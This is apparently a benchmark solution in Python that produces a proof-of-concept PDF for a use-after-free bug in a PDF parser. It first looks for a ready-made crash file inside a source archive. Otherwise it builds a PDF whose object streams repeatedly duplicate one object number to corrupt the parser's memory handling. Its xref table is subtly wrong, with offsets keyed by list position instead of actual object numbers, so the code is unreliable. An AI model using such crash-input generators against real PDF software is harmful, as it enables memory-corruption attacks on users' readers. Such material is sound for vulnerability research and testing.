import os, io, tarfile, re

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Try to locate an existing PoC inside the provided source archive
        try:
            with tarfile.open(src_path, 'r:*') as tar:
                patterns = re.compile(
                    r'(42535152|uaf|useafterfree|use-after-free|poc|crash).*\.pdf$', re.I
                )
                for member in tar.getmembers():
                    name = os.path.basename(member.name)
                    if patterns.search(name):
                        f = tar.extractfile(member)
                        if f:
                            data = f.read()
                            if data:
                                return data
        except Exception:
            pass  # Fallback to generated PoC
        
        # Fallback: generate a crafted PDF that contains duplicate object numbers
        def build_poc():
            header = b'%PDF-1.5\n%\xe2\xe3\xcf\xd3\n'
            objects = []
            # 1 0 obj: Catalog
            objects.append(b'1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n')
            # 2 0 obj: Pages
            objects.append(b'2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n')
            # 3 0 obj: Page
            objects.append(b'3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] >>\nendobj\n')
            
            dup_obj_number = 5  # object number that will be duplicated across streams
            stream_numbers = list(range(4, 20, 2))  # 4,6,8,10,12,14,16,18
            for idx, obj_num in enumerate(stream_numbers):
                # Build stream data with duplicate object number
                content = f'<< /Idx {idx} >>\n'
                index_part = f'{dup_obj_number} 0\n'  # object number + offset 0
                first_val = len(index_part)
                stream_data = (index_part + content).encode('ascii')
                length_val = len(stream_data)
                stream_obj = (
                    f'{obj_num} 0 obj\n'
                    f'<< /Type /ObjStm /N 1 /First {first_val} /Length {length_val} >>\n'
                    f'stream\n'.encode('ascii') + stream_data +
                    b'endstream\nendobj\n'
                )
                objects.append(stream_obj)
            
            # Calculate offsets and build xref
            offsets = {}
            current_offset = len(header)
            for i, obj in enumerate(objects, start=1):
                offsets[i] = current_offset
                current_offset += len(obj)
            xref_offset = current_offset
            max_obj = max(offsets)
            xref_lines = ['xref\n0 {}\n'.format(max_obj + 1)]
            xref_lines.append('0000000000 65535 f \n')
            for obj_id in range(1, max_obj + 1):
                if obj_id in offsets:
                    xoff = offsets[obj_id]
                    xref_lines.append('{:010d} 00000 n \n'.format(xoff))
                else:
                    xref_lines.append('0000000000 65535 f \n')
            xref_str = ''.join(xref_lines).encode('ascii')
            
            trailer = (
                f'trailer\n<< /Size {max_obj + 1} /Root 1 0 R >>\n'
                f'startxref\n{xref_offset}\n%%EOF\n'
            ).encode('ascii')
            
            return header + b''.join(objects) + xref_str + trailer
        
        return build_poc()
